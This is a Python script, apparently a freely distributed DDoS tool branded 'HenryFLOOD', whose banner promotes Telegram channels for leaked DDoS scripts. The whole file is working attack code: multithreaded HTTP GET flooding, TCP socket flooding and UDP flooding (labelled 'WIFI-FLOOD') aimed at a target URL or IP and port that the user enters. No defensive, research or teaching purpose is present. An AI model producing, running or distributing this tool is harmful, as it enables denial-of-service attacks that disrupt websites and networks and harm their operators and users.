import threading
import requests
import socket
import time
import os
import platform
from colorama import init, Fore, Back, Style

init(autoreset=True)

REQUEST_COUNT = 99_000_000_000

def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def gradient_color(text, color1, color2, split_point):
    """
    Mix two colors for gradient effect.
    """
    first_half = text[:split_point]
    second_half = text[split_point:]
    return Fore.RED + first_half + Fore.BLUE + second_half

def print_banner():
    banner = [
        " _   _ _____ _   _ ______   __   _____ _     ___   ___  ____  ",
        "| | | | ____| \\ | |  _ \\ \\ / /  |  ___| |   / _ \\ / _ \\|  _ \\ ",
        "| |_| |  _| |  \\| | |_) \\ V /   | |_  | |  | | | | | | | | | |",
        "|  _  | |___| |\\  |  _ < | |    |  _| | |__| |_| | |_| | |_| |",
        "|_| |_|_____|_| \\_|_| \\_\\|_|    |_|   |_____\\___/ \\___/|____/ \n",
        "HenryFLOOD | Attacking | Free Tool !",
        "Developer By : HenryNET",
        "Channel: t.me/leak_scriptddos",
        "Telegram: t.me/haibe_vx",
        ""
    ]

    for line in banner:
        half_point = len(line) // 2
        print(gradient_color(line, Fore.RED, Fore.BLUE, half_point))

def http_spam(url):
    for _ in range(REQUEST_COUNT):
        try:
            response = requests.get(url)
            print(f"Attack For {url} - Status: {response.status_code}")
        except requests.RequestException as e:
            print(f"Attack Error")
        time.sleep(0.001)

def tcp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        print(f"Connected to {ip}:{port}")
        for _ in range(REQUEST_COUNT):
            try:
                sock.send(b"X" * 1024)
                print(f"Attack For {ip}:{port}")
            except Exception as e:
                print(f"Error !")
            time.sleep(0.001)
    except Exception as e:
        print(f"Connection error !")
    finally:
        sock.close()

def wifi_flood(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"Start For {ip}:{port}")
        for _ in range(REQUEST_COUNT):
            try:
                sock.sendto(b"X" * 1024, (ip, port))
                print(f"Attack For {ip}:{port}")
            except Exception as e:
                print(f"Error !")
            time.sleep(0.001)
    except Exception as e:
        print(f"Error !")
    finally:
        sock.close()

def main():
    os.system("title Flooding Attacking By HenryNET")
    clear_screen()
    print_banner()
    
    print("Please Select Attack Method !")
    print("1, HTTP-FLOOD")
    print("2, TCP-FLOOD")
    print("3, WIFI-FLOOD")
    choice = input("Henry@Attack~$: ")

    if choice == '1':
        url = input("Enter Target: ")
        thread_count = int(input("Thread: "))

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=http_spam, args=(url,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    elif choice == '2':
        ip = input("Enter IP: ")
        port = int(input("Enter Port: "))
        thread_count = int(input("Thread: "))

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=tcp_flood, args=(ip, port))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    elif choice == '3':
        ip = input("Enter IP Wifi: ")
        port = int(input("Enter Port [53/80]: "))
        thread_count = int(input("Enter Thread: "))

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=wifi_flood, args=(ip, port))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    else:
        print("Choose the Right Method!.")

if __name__ == "__main__":
    main()
